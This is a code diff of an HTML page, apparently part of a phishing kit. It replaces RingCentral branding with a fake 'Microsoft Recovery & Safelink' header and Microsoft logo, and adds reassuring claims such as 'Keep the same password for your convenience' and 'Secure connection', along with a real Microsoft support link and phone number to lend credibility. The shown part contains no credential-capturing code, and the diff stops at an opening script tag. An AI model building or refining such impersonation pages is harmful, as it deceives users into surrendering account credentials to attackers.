@@ -29,7 +29,7 @@ html,body{height:100%;}
     margin-bottom: 20px;
     gap: 20px;
 }
-.ringcentral-logo, .microsoft-logo {
+.microsoft-logo {
     height: 40px;
 }
 .loading-text {
@@ -39,50 +39,62 @@ html,body{height:100%;}
     color: #333;
     text-align: center;
 }
-.ringcentral-text {
+.recovery-text {
     display: flex;
     align-items: center;
     font-family: Arial, sans-serif;
     font-weight: bold;
     font-size: 24px;
+    color: #0078D7;
 }
-.ring {
-    color: #0072D6;
+.features-container {
+    margin-top: 30px;
+    font-family: Arial, sans-serif;
+    text-align: center;
+    max-width: 500px;
 }
-.central {
-    color: #F58E1E;
+.feature-item {
+    margin-bottom: 15px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.feature-icon {
+    margin-right: 10px;
+    color: #0078D7;
+}
+.support-message {
+    margin-top: 40px;
+    font-family: Arial, sans-serif;
+    text-align: center;
+    color: #666;
+    font-size: 14px;
+}
+.help-center-link {
+    color: #0078D7;
+    text-decoration: none;
+    font-weight: bold;
+}
+.help-center-link:hover {
+    text-decoration: underline;
 }
 </style>
 
 <!-- Combined Logos -->
 <div class="logo-container">
-    <!-- RingCentral Logo with Text -->
+    <!-- Microsoft Recovery Logo with Text -->
     <div style="display: flex; align-items: center;">
-        <div class="ringcentral-logo">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 50" height="40">
-                <path fill="#0072D6" d="M24.8,15.5c-0.3-0.3-0.7-0.5-1.1-0.5h-8.8c-0.4,0-0.8,0.2-1.1,0.5l-4.4,4.4c-0.3,0.3-0.5,0.7-0.5,1.1v8.8
-                    c0,0.4,0.2,0.8,0.5,1.1l4.4,4.4c0.3,0.3,0.7,0.5,1.1,0.5h8.8c0.4,0,0.8-0.2,1.1-0.5l4.4-4.4c0.3-0.3,0.5-0.7,0.5-1.1v-8.8
-                    c0-0.4-0.2-0.8-0.5-1.1L24.8,15.5z"/>
-                <path fill="#F58E1E" d="M24.8,34.5c0.3-0.3,0.5-0.7,0.5-1.1v-8.8c0-0.4-0.2-0.8-0.5-1.1l-4.4-4.4c-0.3-0.3-0.7-0.5-1.1-0.5h-8.8
-                    c-0.4,0-0.8,0.2-1.1,0.5l-4.4,4.4c-0.3,0.3-0.5,0.7-0.5,1.1v8.8c0,0.4,0.2,0.8,0.5,1.1l4.4,4.4c0.3,0.3,0.7,0.5,1.1,0.5h8.8
-                    c0.4,0,0.8-0.2,1.1-0.5L24.8,34.5z"/>
-                <path fill="#FFFFFF" d="M14.9,26.1l-3.2-3.2c-0.2-0.2-0.2-0.5,0-0.7l0.7-0.7c0.2-0.2,0.5-0.2,0.7,0l2.5,2.5l5.7-5.7
-                    c0.2-0.2,0.5-0.2,0.7,0l0.7,0.7c0.2,0.2,0.2,0.5,0,0.7l-6.4,6.4C15.4,26.3,15.1,26.3,14.9,26.1z"/>
+        <div class="microsoft-logo">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 23 23" height="40">
+                <path fill="#f25022" d="M1 1h10v10H1z"/>
+                <path fill="#00a4ef" d="M12 1h10v10H12z"/>
+                <path fill="#7fba00" d="M1 12h10v10H1z"/>
+                <path fill="#ffb900" d="M12 12h10v10H12z"/>
             </svg>
         </div>
-        <div class="ringcentral-text">
-            <span class="ring">Ring</span><span class="central">Central</span>
+        <div class="recovery-text">
+            Microsoft Recovery & Safelink
         </div>
-    </div>
-    
-    <!-- Microsoft Logo -->
-    <div class="microsoft-logo">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 23 23" height="40">
-            <path fill="#f25022" d="M1 1h10v10H1z"/>
-            <path fill="#00a4ef" d="M12 1h10v10H12z"/>
-            <path fill="#7fba00" d="M1 12h10v10H1z"/>
-            <path fill="#ffb900" d="M12 12h10v10H12z"/>
-        </svg>
     </div>
 </div>
 
@@ -93,6 +105,24 @@ html,body{height:100%;}
 </div>
 
 <svg id="loadingSpinner" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 80 80" style="height: 80px;width: 80px;min-width: 80px;min-height: 80px;transform-origin: 40px 40px 40px;transition: .5s; animation: spinnerAnimation 1.3s infinite cubic-bezier(0.46, 0.03, 0.52, 0.96);"><defs><path id="a" d="M0 0h40v40H0z"></path></defs><g fill="none" fill-rule="evenodd"><circle cx="40" cy="40" r="38" stroke="#DEECF9" stroke-width="2.817"></circle><g transform="translate(40)"><mask id="b" fill="#fff"><use xlink:href="#a"></use></mask><circle cy="40" r="38" stroke="#0078D7" stroke-width="2.817" mask="url(#b)"></circle></g></g></svg>
+
+<!-- Features Section -->
+<div class="features-container">
+    <div class="feature-item">
+        <span class="feature-icon">✓</span>
+        <span>Keep the same password for your convenience</span>
+    </div>
+    <div class="feature-item">
+        <span class="feature-icon">✓</span>
+        <span>Secure connection to protect your information</span>
+    </div>
+</div>
+
+<!-- Support Message -->
+<div class="support-message">
+    Need help? Our <a href="https://support.microsoft.com" class="help-center-link">Help Center</a> is available 24/7<br>
+    Microsoft Customer Support: 1-800-MICROSOFT (1-800-642-7676)
+</div>
 </div>
    
 <script>
